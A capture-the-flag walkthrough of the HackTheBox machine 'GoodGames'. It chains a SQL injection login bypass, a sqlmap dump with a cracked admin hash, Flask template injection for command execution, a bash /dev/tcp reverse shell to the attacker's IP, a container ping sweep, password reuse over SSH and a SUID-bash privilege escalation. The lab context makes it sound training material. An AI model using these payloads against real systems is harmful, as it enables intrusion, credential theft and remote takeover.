# Hackthebox - Good ganes - Linux

## Nmap

```
┌──(root💀kali)-[~]
└─# nmap -T5 -sC -sV -O -p- 10.10.11.130
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-23 19:48 EDT
Nmap scan report for 10.10.11.130
Host is up (0.024s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.51
|_http-title: GoodGames | Community and Store
|_http-server-header: Werkzeug/2.0.2 Python/3.9.2
Aggressive OS guesses: Linux 4.15 - 5.6 (95%), Linux 5.0 - 5.3 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Linux 5.3 - 5.4 (94%), Linux 2.6.32 (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.4 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: goodgames.htb

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.88 seconds
```

## Port 80

- We have a video game website  
![image](https://user-images.githubusercontent.com/96747355/164950274-5e2afafa-4f06-40d8-ae16-f0c22b7312b7.png)  

We have a SQL injection that allows us to bypass login.
- Request
```
POST /login HTTP/1.1
Host: 10.10.11.130
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 33
Origin: http://10.10.11.130
Connection: close
Referer: http://10.10.11.130/
Upgrade-Insecure-Requests: 1

email=' or 1=1-- -&password=eeeee
```

- Response

```
[STRIPPED]
                   <h1 class="text-main-1" style="font-size: 50px;">Login Successful</h1>

                    <div class="nk-gap"></div>
                    <h2 class="h4">Welcome admintest</h2>

                    <div>Redirecting you to profile page...</div>
                    <div class="nk-gap-3"></div>
[STRIPPED]
```

- Now in our profile page we have settings, it requires de change the /etc/host file though `10.10.11.130    internal-administration.goodgames.htb`
This page has another login thoug so we need to try to dump some data with SQLi  
![image](https://user-images.githubusercontent.com/96747355/164950482-48efcc90-a2c9-4bc6-817b-58c9dd7c2fe0.png)  
- With union we can actually dump some interesting things: `email=' union select 1,2,3,database()-- -&password=eeeee`
  - the current database is main
- We can just save the request in a file and use sqlmap to dump the db
  - In burp we right click on a request (without sql injection) save item  
  ![image](https://user-images.githubusercontent.com/96747355/164950738-cc722c5a-6146-497c-a3ec-5334b52057c9.png)  
  - Save it as request and then we just have to pass it to sqlmap this way `sqlmap -r request -p email` I manually with burp repeater saw tha the database name was main so I can dump it this way `sqlmap -r request -p email --dump -D main`

### SQLmap results

We get the admin hash this way!
```
+----+-------+---------------------+----------------------------------+
| id | name  | email               | password                         |
+----+-------+---------------------+----------------------------------+
| 1  | admin | admin@goodgames.htb | 2b22337f218b2d82dfc3b6f77e7cb8ec |
| 2  | test  | test@test.com       | 098f6bcd4621d373cade4e832627b4f6 |
+----+-------+---------------------+----------------------------------+
```
- We put the hash in crackstation and get the password this way `superadministrator`  
- ![image](https://user-images.githubusercontent.com/96747355/164950810-96d995ad-7fb5-4546-9071-53732b2cde41.png)  

## Volt

- Using the password we can now login to volt  
![image](https://user-images.githubusercontent.com/96747355/164950857-039fa582-2e8b-42a6-92bf-bee93f619107.png)  

- After a look on the platform we can interact in the settings and modify the full name  
![image](https://user-images.githubusercontent.com/96747355/164951414-5e68efef-312f-4dc0-8569-ebcfff451db9.png)  
So this is an injection point with something actually reflected to us. If we look for common flask exploitation we can find an article about [SSTI](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection)
If we try the first paylaod mentioned in the article using burp repeater it seems to work:  
![image](https://user-images.githubusercontent.com/96747355/164951469-b8892648-7638-4cc7-9286-e99e9d65e5c8.png)  
We can see that `{{7*7}}` gives 49
- This way we can get the config using `{{config}}`  
```                           
&lt;Config {&#39;ENV&#39;: &#39;production&#39;, &#39;DEBUG&#39;: False, &#39;TESTING&#39;: False, &#39;PROPAGATE_EXCEPTIONS&#39;: None, &#39;PRESERVE_CONTEXT_ON_EXCEPTION&#39;: None, &#39;SECRET_KEY&#39;: &#39;S3cr3t_K#Key&#39;, &#39;PERMANENT_SESSION_LIFETIME&#39;: datetime.timedelta(31), &#39;USE_X_SENDFILE&#39;: False, &#39;SERVER_NAME&#39;: None, &#39;APPLICATION_ROOT&#39;: &#39;/&#39;, &#39;SESSION_COOKIE_NAME&#39;: &#39;session&#39;, &#39;SESSION_COOKIE_DOMAIN&#39;: False, &#39;SESSION_COOKIE_PATH&#39;: None, &#39;SESSION_COOKIE_HTTPONLY&#39;: True, &#39;SESSION_COOKIE_SECURE&#39;: False, &#39;SESSION_COOKIE_SAMESITE&#39;: None, &#39;SESSION_REFRESH_EACH_REQUEST&#39;: True, &#39;MAX_CONTENT_LENGTH&#39;: None, &#39;SEND_FILE_MAX_AGE_DEFAULT&#39;: None, &#39;TRAP_BAD_REQUEST_ERRORS&#39;: None, &#39;TRAP_HTTP_EXCEPTIONS&#39;: False, &#39;EXPLAIN_TEMPLATE_LOADING&#39;: False, &#39;PREFERRED_URL_SCHEME&#39;: &#39;http&#39;, &#39;JSON_AS_ASCII&#39;: True, &#39;JSON_SORT_KEYS&#39;: True, &#39;JSONIFY_PRETTYPRINT_REGULAR&#39;: False, &#39;JSONIFY_MIMETYPE&#39;: &#39;application/json&#39;, &#39;TEMPLATES_AUTO_RELOAD&#39;: None, &#39;MAX_COOKIE_SIZE&#39;: 4093, &#39;SQLALCHEMY_DATABASE_URI&#39;: &#39;sqlite:////backend/project/apps/db.sqlite3&#39;, &#39;SQLALCHEMY_TRACK_MODIFICATIONS&#39;: False, &#39;SQLALCHEMY_BINDS&#39;: None, &#39;SQLALCHEMY_NATIVE_UNICODE&#39;: None, &#39;SQLALCHEMY_ECHO&#39;: False, &#39;SQLALCHEMY_RECORD_QUERIES&#39;: None, &#39;SQLALCHEMY_POOL_SIZE&#39;: None, &#39;SQLALCHEMY_POOL_TIMEOUT&#39;: None, &#39;SQLALCHEMY_POOL_RECYCLE&#39;: None, &#39;SQLALCHEMY_MAX_OVERFLOW&#39;: None, &#39;SQLALCHEMY_COMMIT_ON_TEARDOWN&#39;: False, &#39;SQLALCHEMY_ENGINE_OPTIONS&#39;: {}}&gt;
```
- These slides are also quite helpful, if we try this payload we get the "id" and we are root right away `name={{ namespace.__init__.__globals__.os.popen('id').read() }}`
- Lets grab the flags `name={{ namespace.__init__.__globals__.os.popen('cat /home/augustus/user.txt').read() }}`
- I can not grab the root flag.
- Let's try to get a shell
- We got a shell from the web application (not burp) using this paylaod `{{ namespace.__init__.__globals__.os.popen('bash -c "bash -i >& /dev/tcp/10.10.14.3/5555 0>&1"').read() }}`  
- Then we upgraded our shell 
```
script /dev/null -c bash
ctrl Z
stty raw -echo; fg
reset
```
OR
```
python -c 'import pty; pty.spawn("/bin/bash")'
```

- Than we can make a ping sweep to look for where is the reak machine as we are in a docker container (hence the docker file in the folder)
```
for i in {1..254}; do (ping -c 1 172.19.0.${i} | grep "bytes from" | grep -v "Unreachable" &); done;
```
![image](https://user-images.githubusercontent.com/96747355/164954211-c899af5a-6b04-44b5-9d7d-c4548c861c73.png)  
- if we ssh with augustus and the same password on 172.19.0.1 we get a user shell

## Privesc

- So we are in 2 env one in a docker with root rights and one in the actual machine with just user rights, let's abuse this to our advantage.
  - Take another reverse shell to the docker (now we have 2 shells)
  - In our augustus shell `cp /bin/bash .`
  - In our root docker shell `chmod 4777 bash`
  - In our augustus `./bash -p`
  - We should be root!
- Let's grab the flag `cat /root/root.txt`

